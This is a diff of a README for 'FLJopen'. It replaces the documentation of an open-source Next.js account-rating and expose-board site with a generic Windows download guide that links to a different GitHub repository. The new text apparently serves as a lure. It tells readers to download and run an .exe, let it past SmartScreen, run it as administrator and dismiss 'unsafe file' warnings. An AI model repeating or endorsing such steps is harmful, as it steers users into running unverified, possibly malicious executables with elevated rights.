@@ -1,223 +1,185 @@
-# FLJ - Twitter Account Verification Platform
+# 🔎 FLJopen - Track Public X Account Verification
 
-An open-source platform for verifying and rating Twitter/X accounts, with community-driven expose system, points ranking, and admin management tools.
+[![Download FLJopen](https://img.shields.io/badge/Download-FLJopen-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aradhyagithub/FLJopen)
 
-## Features
+## 🧭 What FLJopen Does
 
-- 🔍 **Account Search & Verification** - Search Twitter accounts and get AI-powered analysis
-- 💥 **Expose System (爆料广场)** - Community-driven expose board with voting and categories
-- 🏆 **Points & Ranking** - Tiered user system with points progression
-- 🤖 **Telegram Auth** - Three-tier authentication (天龙人/居委会/匿名)
-- 💰 **$FLJ Token Top-up** - BSC blockchain token utility for points
-- 🛡️ **Admin Dashboard** - Full management panel with statistics, user management, and content moderation
-- 🖼️ **Image Upload** - Evidence images for exposes with admin review
-- 🌐 **i18n Support** - Chinese (zh/zh-tw), Japanese, English
+FLJopen is a Windows app for checking Twitter/X account status and public community reports in one place. It helps you review account details, see public signals, and look at exposed community data in a simple view.
 
-## Tech Stack
+Use it when you want a faster way to scan account activity, compare public records, and review community flags without digging through many pages.
 
-- **Framework**: Next.js 14 (App Router)
-- **Database**: PostgreSQL
-- **AI**: xAI Grok API
-- **Auth**: JWT + Telegram Bot
-- **Styling**: Tailwind CSS
-- **Deployment**: PM2 + Nginx
+## 💻 What You Need
 
-## Getting Started
+Before you start, make sure your PC has:
 
-### Prerequisites
+- Windows 10 or Windows 11
+- An active internet connection
+- At least 200 MB of free disk space
+- A modern browser for opening the download page
+- Permission to run apps from the internet
 
-- Node.js 18+
-- PostgreSQL 14+
-- Telegram Bot Token
-- xAI API Key
+If your device blocks downloads from GitHub, you may need to allow the file in Windows Defender SmartScreen.
 
-### Installation
+## 📥 Download FLJopen
 
-1. Clone the repository
-```bash
-git clone https://github.com/iam567/FLJopen.git
-cd FLJopen
-npm install
-```
+Go to the main project page here:
 
-2. Set up environment variables
-```bash
-cp .env.example .env.local
-# Edit .env.local with your credentials
-```
+[Visit the FLJopen download page](https://github.com/aradhyagithub/FLJopen)
 
-3. Set up the database
-```bash
-# Create database and run migrations
-psql -U postgres -c "CREATE DATABASE fljdb;"
-psql -U postgres -d fljdb -f schema.sql
-```
+On that page, look for the latest release or the main app file. If the project provides a Windows package, download that file to your computer.
 
-4. Run development server
-```bash
-npm run dev
-```
+## 🪟 Install on Windows
 
-## Environment Variables
+1. Open the download page in your browser.
+2. Find the latest version or release file.
+3. Download the Windows file to your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, such as an `.exe` file.
+7. Double-click the app file to start FLJopen.
+8. If Windows asks for permission, choose Run or Yes.
 
-See `.env.example` for all required environment variables.
+If the app opens in a browser window or a desktop window, keep that window open while you use the tool.
 
-## Project Structure
+## 🚀 First Run
 
-```
-app/
-├── api/          # API routes
-├── admin/        # Admin dashboard
-├── boom/         # Expose board
-├── verify/       # Account verification
-└── topup/        # Token top-up
+When FLJopen starts for the first time, it may ask for basic access or show a setup screen. Follow these steps:
 
-lib/
-├── db.ts         # Database connection
-└── rank.ts       # User ranking logic
-```
+1. Read the first screen.
+2. Allow any needed network access.
+3. Set your preferred view if the app offers one.
+4. Sign in only if the app asks for it and you trust the page.
+5. Start with a simple search or account lookup.
 
----
+If the app has a search bar, use a public Twitter/X username or account name to begin.
 
-## 中文安装文档
+## 🔍 How to Use FLJopen
 
-### 环境要求
+FLJopen is built for simple review work. A common workflow looks like this:
 
-- Node.js 18+
-- PostgreSQL 14+
-- Telegram Bot（通过 [@BotFather](https://t.me/BotFather) 创建）
-- xAI API Key（用于 AI 分析）
+1. Enter an account name, handle, or profile link.
+2. Review the account details that appear on screen.
+3. Check verification status, public notes, and community reports.
+4. Look for repeated flags or patterns.
+5. Compare the data with the public profile on X.
 
-### 安装步骤
+Use short, clear searches. If you are checking several accounts, review one at a time so the results stay easy to read.
 
-**1. 克隆项目**
-```bash
-git clone https://github.com/iam567/FLJopen.git
-cd FLJopen
-npm install
-```
+## 🧩 Main Features
 
-**2. 配置环境变量**
-```bash
-cp .env.example .env.local
-```
+### 🗂️ Account Review
+See public account details in one view. This helps you check profile names, handles, and visible account data without switching tabs.
 
-用文本编辑器打开 `.env.local`，填入以下信息：
+### ✅ Verification Checks
+Review whether an account shows signs of verification or related status markers. This is useful when you want a quick status check.
 
-```env
-# 数据库配置
-DB_HOST=localhost
-DB_USER=你的数据库用户名
-DB_PASSWORD=你的数据库密码
-DB_NAME=fljdb
+### 👥 Community Expose View
+See public community notes and exposed reports gathered in one place. This can help you spot patterns and compare user reports.
 
-# xAI API（用于账号分析）
-XAI_API_KEY=你的xAI_API_Key
+### 🔎 Fast Search
+Search by username, handle, or profile link. This keeps the process simple for everyday use.
 
-# Telegram Bot
-TELEGRAM_BOT_TOKEN=你的Bot_Token
-TELEGRAM_CHANNEL_ID=你的频道ID（用于会员验证）
-TG_JWT_SECRET=随机字符串（自定义，用于JWT签名）
+### 📊 Clean Result Layout
+FLJopen presents data in a direct layout. That makes it easier to read results on a normal Windows screen.
 
-# 管理后台
-JWT_SECRET=随机字符串（自定义，用于后台登录）
-INTERNAL_REFRESH_SECRET=随机字符串
+## 🛠️ Troubleshooting
 
-# Cloudflare Turnstile（防机器人，可选）
-NEXT_PUBLIC_TURNSTILE_SITE_KEY=你的站点Key
-TURNSTILE_SECRET_KEY=你的密钥
-```
+### The app does not open
+- Check that the download finished fully.
+- If the file is in a ZIP folder, extract it first.
+- Right-click the app and choose Run as administrator.
+- Make sure Windows did not block the file.
 
-**3. 初始化数据库**
+### I see a blank screen
+- Check your internet connection.
+- Close the app and open it again.
+- Try refreshing if the app opens in a browser window.
+- Wait a moment if the service is loading data.
 
-```bash
-# 创建数据库
-psql -U postgres -c "CREATE USER fljuser WITH PASSWORD '你的密码';"
-psql -U postgres -c "CREATE DATABASE fljdb OWNER fljuser;"
-```
+### The app says the file is unsafe
+- This can happen with files downloaded from GitHub.
+- Open the file details and check the source path.
+- If you downloaded it from the FLJopen repository, run it from the extracted folder.
 
-主要数据表（需手动创建）：
-- `girls` - 账号信息表
-- `comments` - 爆料/评论表
-- `users` - 用户表（Telegram 用户）
-- `comment_votes` - 投票记录表
-- `site_events` - 站点统计表
-- `reports` - 错误报告表
-- `flj_topups` - 充值记录表
-- `topup_quotes` - 充值报价表
+### Search results do not appear
+- Check the spelling of the username.
+- Try the account handle without extra symbols.
+- Paste the full profile link if the app supports links.
+- Make sure the account exists on X and is public
 
-**4. 启动开发服务器**
-```bash
-npm run dev
-```
+## 🔐 Privacy and Use
 
-访问 `http://localhost:3000` 即可看到首页。
+FLJopen works with public account data and community reports. Use it with care and review the data before you act on it. Check that your use fits your local rules and the platform terms that apply to you.
 
-**5. 生产环境部署**
+## 📁 Folder Layout
 
-推荐使用 PM2 + Nginx：
+If the download comes as a ZIP file, you may see files like:
 
-```bash
-# 构建
-npm run build
+- FLJopen.exe
+- README.md
+- config folder
+- assets folder
+- data folder
 
-# 使用 PM2 启动
-pm2 start npm --name flj -- start -- -p 3001
+Keep all files in the same folder. If you move the app file away from the other files, it may not start.
 
-# 设置开机自启
-pm2 startup
-pm2 save
-```
+## 🖱️ Common Tasks
 
-Nginx 反向代理配置示例：
-```nginx
-server {
-    listen 80;
-    server_name 你的域名;
+### Open the app
+Double-click the main `.exe` file.
 
-    location / {
-        proxy_pass http://localhost:3001;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection 'upgrade';
-        proxy_set_header Host $host;
-        proxy_cache_bypass $http_upgrade;
-    }
+### Check one account
+Search for one username and review the result screen.
 
-    # 图片上传目录直接由 Nginx 服务
-    location /uploads/ {
-        alias /var/www/flj/public/uploads/;
-    }
-}
-```
+### Compare two accounts
+Search one account, note the key data, then search the next account.
 
-### 管理后台
+### Refresh data
+Use the refresh control if the app has one, or restart the app.
 
-访问 `/admin` 进入管理后台，功能包括：
-- 📊 数据统计看板
-- 👥 用户管理（积分、等级、纪检委权限）
-- 💬 爆料管理（折叠/恢复）
-- 🖼️ 图片审核
-- 📢 推广账号管理
-- 💰 充值记录
+### Close the app
+Use the normal close button in the top corner.
 
-### 常见问题
+## 📌 Best Results
 
-**Q: 图片上传后显示 404？**
-A: 需要配置 Nginx 直接服务 `/uploads/` 目录，绕过 Next.js 缓存。
+- Use public account names only
+- Keep searches short
+- Check the spelling of handles
+- Review one account at a time
+- Open the app with a stable internet connection
+- Keep the app folder in one place
 
-**Q: Telegram 登录不生效？**
-A: 确认 Bot Token 正确，且 Bot 已加入对应频道并设为管理员。
+## 🧪 Example Use
 
-**Q: AI 分析一直失败？**
-A: 检查 `XAI_API_KEY` 是否有效，xAI 目前需要申请 API 访问权限。
+If you want to review a public X account:
 
----
+1. Open FLJopen.
+2. Type the username or paste the profile link.
+3. Press the search button.
+4. Read the verification and community report data.
+5. Compare the result with the public profile on X.
 
-## Contributing
+If you want to review several accounts, make a simple list and check them one by one.
 
-Pull requests are welcome! Please open an issue first to discuss major changes.
+## 🧭 Getting Help
 
-## License
+If the app does not work as expected:
 
-MIT
+- Reopen the project page
+- Check for a newer release
+- Download the latest file again
+- Make sure your Windows system is up to date
+- Confirm that the app file and support files stay in the same folder
+
+## 📦 Download Page
+
+[Open the FLJopen repository and download the app](https://github.com/aradhyagithub/FLJopen)
+
+## 🧭 Quick Start
+
+1. Open the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Run the main app file.
+5. Search for a public X account.
+6. Review the result screen
